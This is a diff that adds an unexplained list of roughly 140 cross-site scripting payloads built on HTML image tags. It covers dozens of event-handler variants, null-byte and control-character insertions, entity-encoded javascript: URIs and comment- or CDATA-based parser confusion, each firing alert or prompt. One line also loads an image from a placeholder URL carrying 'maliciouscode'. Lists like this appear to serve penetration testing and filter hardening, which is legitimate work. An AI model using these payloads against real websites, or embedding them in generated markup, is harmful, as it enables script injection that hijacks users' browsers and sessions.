@@ -1,0 +1,140 @@
+                           IMAGE TAG BASED PAYLOADs
+
+<img \x00src=x onerror="alert(1)">
+<img \x47src=x onerror="javascript:alert(1)">
+<img \x11src=x onerror="javascript:alert(1)">
+<img \x12src=x onerror="javascript:alert(1)">
+<img\x47src=x onerror="javascript:alert(1)">
+<img\x10src=x onerror="javascript:alert(1)">
+<img\x13src=x onerror="javascript:alert(1)">
+<img\x32src=x onerror="javascript:alert(1)">
+<img\x47src=x onerror="javascript:alert(1)">
+<img\x11src=x onerror="javascript:alert(1)">
+<img \x47src=x onerror="javascript:alert(1)">
+<img \x34src=x onerror="javascript:alert(1)">
+<img \x39src=x onerror="javascript:alert(1)">
+<img \x00src=x onerror="javascript:alert(1)">
+<img src\x09=x onerror="javascript:alert(1)">
+<img src\x10=x onerror="javascript:alert(1)">
+<img src\x13=x onerror="javascript:alert(1)">
+<img src\x32=x onerror="javascript:alert(1)">
+<img src\x12=x onerror="javascript:alert(1)">
+<img src\x11=x onerror="javascript:alert(1)">
+<img src\x00=x onerror="javascript:alert(1)">
+<img src\x47=x onerror="javascript:alert(1)">
+<img src=x\x09onerror="javascript:alert(1)">
+<img src=x\x10onerror="javascript:alert(1)">
+<img src=x\x11onerror="javascript:alert(1)">
+<IMG SRC="javascript:alert('XSS')"
+<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
+<img src=x\x12onerror="javascript:alert(1)">
+<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
+<img/src=@&#32;&#13; onerror = prompt('&#49;')
+<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)&#34;&#62;<svg><style>{-o-link-source&colon;
+<img src="/" =_=" title="onerror='prompt(1)'">
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<img src=foo.png onerror=alert(/xssed/) />
+<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">
+<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">
+<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<img src="javascript:alert('XSS')">
+<IMG LOWSRC=\"javascript:alert('XSS')\">
+<IMG DYNSRC=\"javascript:alert('XSS')\">
+<IMG SRC=x onload="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onafterprint="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onbeforeprint="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onbeforeunload="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onerror="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onhashchange="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onload="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmessage="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x ononline="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onoffline="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onpagehide="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onpageshow="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onpopstate="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onresize="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onstorage="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onunload="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onblur="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onchange="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x oncontextmenu="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x oninput="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x oninvalid="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onreset="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onsearch="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onselect="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onsubmit="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onkeydown="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onkeypress="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onkeyup="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onclick="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondblclick="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmousedown="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmousemove="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmouseout="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmouseover="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmouseup="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onmousewheel="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onwheel="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondrag="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondragend="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondragenter="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondragleave="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondragover="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondragstart="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondrop="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onscroll="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x oncopy="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x oncut="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onpaste="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onabort="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x oncanplay="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x oncanplaythrough="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x oncuechange="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x ondurationchange="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onemptied="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onended="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onerror="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onloadeddata="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onloadedmetadata="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onloadstart="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onpause="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onplay="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onplaying="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onprogress="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onratechange="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onseeked="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onseeking="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onstalled="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onsuspend="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x ontimeupdate="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onvolumechange="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onwaiting="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onshow="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x ontoggle="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onload="alert(String.fromCharCode(88,83,83))">
+<img src=``&NewLine; onerror=alert(1)&NewLine;
+<img src=x\x13onerror="javascript:alert(1)">
+<img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)">
+<img src=x onerror=\x09"javascript:alert(1)">
+<img src=x onerror=\x10"javascript:alert(1)">
+<img src=x onerror=\x11"javascript:alert(1)">
+<img src=x onerror=\x12"javascript:alert(1)">
+<img src=x onerror=\x32"javascript:alert(1)">
+<img src=x onerror=\x00"javascript:alert(1)">
+<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>
+<img src="x` `<script>javascript:alert(1)</script>"` `>
+<img src onerror /" '"= alt=javascript:alert(1)//">
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<comment><img src="</comment><img src=x onerror=javascript:alert(1))//">
+<![><img src="]><img src=x onerror=javascript:alert(1)//">
